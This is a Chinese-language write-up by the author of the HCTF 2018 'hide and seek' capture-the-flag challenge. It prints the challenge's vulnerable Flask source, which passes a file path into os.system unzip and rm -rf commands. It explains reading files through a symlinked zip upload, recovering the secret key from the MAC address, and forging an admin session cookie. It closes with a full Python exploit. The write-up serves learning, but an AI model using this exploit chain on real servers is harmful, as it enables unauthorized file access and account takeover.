 # hctf2018_hide_and_seek_wp

- 话不多说，首先自己得挨一顿毒打，真的抱歉，因为bug导致浪费了各位师傅大量时间。另外各位师傅私聊让我check的时候，我确实是check了，真没敷衍，....只是exp也有点bug，这就很僵硬了，专业bug写手，诶还是太菜了。

## step1:

- 访问 http://hideandseek.2018.hctf.io/ 提示要登录，随便试几个登录，发现只有admin不能登录，然后登录成功后发现名为session的cookie中有一段疑似base64，尝试decode，发现是类似{"username":"123"}的信息，如果手动构造base64部分的信息为{"username":"admin"}就会失去登录状态（有经验的师傅可以猜到使用的是securecookie机制，如果能够得到签名的key和签名方法等相关信息就能想办法伪造session）	如果不知道也没有关系，思路是一样的，先想办法得到源代码。



## step2:
- 登录成功后发现有一个上传点，经过测试只能上传zip文件，上传之后回返回zip解压后的文件内容。尝试压缩一个软链接文件并上传，链接指向`/etc/passwd`，发现有回显相应的文件内容。这样就得到了一个任意文件下载



## step3:
- 接下来是想办法获得源代码路径。
- 思路1：一波猜测啥也没有，结合题目名称hide and seek，这里应该是一个点。然后这里linux中有一个思想是`一切皆文件`，了解到linux下，`/proc/`路径下保存进程相关信息，https://www.cnblogs.com/DswCnblog/p/5780389.html ，然后尝试过后在 /proc/self/environ (self可以换成其他pid号)环境变量中可以找到配置文件路径和一些信息
```
UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi
SUPERVISOR_GROUP_NAME=uwsgi
HOSTNAME=ff4d6ee39413
SHLVL=0
PYTHON_PIP_VERSION=18.1
HOME=/root
GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
UWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini
NGINX_MAX_UPLOAD=0
UWSGI_PROCESSES=16
STATIC_URL=/static
UWSGI_CHEAPER=2
NGINX_VERSION=1.13.12-1~stretch
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NJS_VERSION=1.13.12.0.2.0-1~stretch
LANG=C.UTF-8
SUPERVISOR_ENABLED=1
PYTHON_VERSION=3.6.6
NGINX_WORKER_PROCESSES=auto
SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock
SUPERVISOR_PROCESS_NAME=uwsgi
LISTEN_PORT=80
STATIC_INDEX=0
PWD=/app/hard_t0_guess_n9f5a95b5ku9fg
STATIC_PATH=/app/static
PYTHONPATH=/app
UWSGI_RELOADS=0
```
- 思路2：一波猜测还真的就可以猜出点东西，从之前的cookie可以猜测是flask，然后猜测路径为/app/main.py，得到如下
```
from flask import Flask
app = Flask(__name__)


@app.route("/")
def hello():
    return "Hello World from Flask in a uWSGI Nginx Docker container with \
     Python 3.6 (default)"

if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=True, port=80)
```
- docker一搜就出来了，然后就可以自己搭环境，配置docker然后试试看有那些地方可能有用信息了，然后回到思路1


- 关于hint1：docker 。
1. 因为docker基本都是linux，而linux就有上述文件特性，对应思路1。
2. 另外提示环境是在docker中的，那么结合之前猜测的flask，或者结合自己读到的一些其他信息，比如`/app/uwsgi.ini`或者`/proc/pid/cmdline`（有好多选手都读到了这个文件，但是没有继续深挖其他信息，比如`/proc/10/cmdline`就有uwsgi.ini）然后可以搜索docker image，搜索flask或者uwsgi第一个都是`tiangolo/uwsgi-nginx-flask`，下载下来部署会发现里面默认有/app/main.py ，这个时候可以尝试验证一下题目环境中有没有这个文件，如果有，那大致就确定了docker环境，对应思路2
- 关于hint2：only few things running on it。主要有一些选手从`/proc/1/cmdline`一直扫到`/proc/9999/cmdline`都不死心...所以放出这个hint


- 发现配置文件路径后，再读配置文件 /app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini
```
[uwsgi]
module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main
callable=app
```
- 这样就找到了源代码路径/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py
```python
# -*- coding: utf-8 -*-
from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
import uuid
import base64
import random
import flag
from werkzeug.utils import secure_filename
import os
random.seed(uuid.getnode())
app = Flask(__name__)
app.config['SECRET_KEY'] = str(random.random()*100)
app.config['UPLOAD_FOLDER'] = './uploads'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
ALLOWED_EXTENSIONS = set(['zip'])

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/', methods=['GET'])
def index():
    error = request.args.get('error', '')
    if(error == '1'):
        session.pop('username', None)
        return render_template('index.html', forbidden=1)

    if 'username' in session:
        return render_template('index.html', user=session['username'], flag=flag.flag)
    else:
        return render_template('index.html')


@app.route('/login', methods=['POST'])
def login():
    username=request.form['username']
    password=request.form['password']
    if request.method == 'POST' and username != '' and password != '':
        if(username == 'admin'):
            return redirect(url_for('index',error=1))
        session['username'] = username
    return redirect(url_for('index'))


@app.route('/logout', methods=['GET'])
def logout():
    session.pop('username', None)
    return redirect(url_for('index'))

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'the_file' not in request.files:
        return redirect(url_for('index'))
    file = request.files['the_file']
    if file.filename == '':
        return redirect(url_for('index'))
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        if(os.path.exists(file_save_path)):
            return 'This file already exists'
        file.save(file_save_path)
    else:
        return 'This file is not a zipfile'


    try:
        extract_path = file_save_path + '_'
        os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
        read_obj = os.popen('cat ' + extract_path + '/*')
        file = read_obj.read()
        read_obj.close()
        os.system('rm -rf ' + extract_path)
    except Exception as e:
        file = None

    os.remove(file_save_path)
    if(file != None):
        if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
            return redirect(url_for('index', error=1))
    return Response(file)


if __name__ == '__main__':
    #app.run(debug=True)
    app.run(host='127.0.0.1', debug=True, port=10008)

```
- 然后还有模板中关键代码，模板位置/app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html
```
{% if user == 'admin' %}
        Your flag: <br>
        {{ flag  }}
```
- 做到这里，读一下源码基本都有底了，从源代码中我们知道直接读flag是不可行的，必须要让自己成为admin才能获得flag

## step4:
- 这里通过源码确定是flask的默认的securecookie机制，接下来目标就是伪造admin的session了，这里session内容由base64+签名组成，所以可以通过获得key来伪造签名，注意到
```
random.seed(uuid.getnode())
app = Flask(__name__)
app.config['SECRET_KEY'] = str(random.random()*100)
app.config['UPLOAD_FOLDER'] = './uploads'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
```

- 需要注意到前面获得的配置信息中写了python3.6
`uuid.getnode()`获得10进制mac地址，同样利用linux文件特性，最后可以在`/sys/class/net/eth0/address` 获得这个mac
- 然后是一个伪随机，可以模拟。最终得到SECRET_KEY。
- 之后可以自己搭个简单的flask环境来获得session值，带着这个session访问即获得flag

## 总结
1. zip软链接->任意文件下载  （这个想法是之前做过一次题，当时那题直接给出flag路径，我觉得这就没意思了）
2. linux文件特性->获得源码路径和mac地址 （偶然看到linux的`一切皆文件`思维，觉得很厉害）
3. 最终进行flask的session伪造 （偶然看到flask的cookie，居然base64存疑似session信息，我都惊了，不过搜索了一下，原来这种client session是也有一定的安全措施，是加了签名的，又叫securecookie，虽然我还是觉得不够安全。于是周五开赛当天的中午突然脑洞一开，把这些组合到了一起，把原来的题给改了，又于时间仓促，测试时间不足，第一次出题也没经验，然后就出了比赛中的bug...再次抱歉）



下面附上exp
```python
#!/usr/bin/env python3
# coding=utf-8
import requests
import random
import re
import os
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

def read_file(file_name):
    link(file_name)
    files = {'the_file': open(file_name[-5:] + '.zip', 'rb')}
    r2 = s.post(url+'upload', files=files)
    return r2.text

def link(file_name):
    os.system('ln -s {file_name} {output}'.format(file_name = file_name, output = file_name[-5:]))
    os.system('zip -y -m {output}.zip {output}'.format(file_name = file_name, output = file_name[-5:]))


url = 'http://hideandseek.2018.hctf.io/'
with requests.Session() as s:
    user_data = {'username': '123', 'password': '123456789'}
    r = s.post(url+'login', data=user_data)
    en = read_file('/proc/self/environ')
    print(en)
    ini = re.search('UWSGI_INI=(.*?)\x00', en).group(1)
    pwd = re.search('PWD=(.*?)\x00', en).group(1)
    print(ini)
    print(pwd)
    ini = read_file(ini)
    print(ini)
    source = re.search('module = .*?\.(.*?)\n', ini).group(1)
    source = pwd+'/'+source+'.py'
    source = read_file(source)
    print(source)
    if(source.find('import') == -1):
        exit('fail')
    mac = '/sys/class/net/eth0/address'
    mac = read_file(mac)
    mac = mac[:-1]
    mac = ''.join(mac.split(':'))
    mac = int(mac, 16)
    print(mac)
    random.seed(mac)
    key = random.random()*100
    print(key)

app = Flask(__name__)
app.config['SECRET_KEY'] = str(key)
payload = {'username': 'admin'}
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
session = serializer.dumps(payload)
print(session)
cookies = {'session': session}
r = requests.get(url, cookies=cookies)
print(r.text)


```
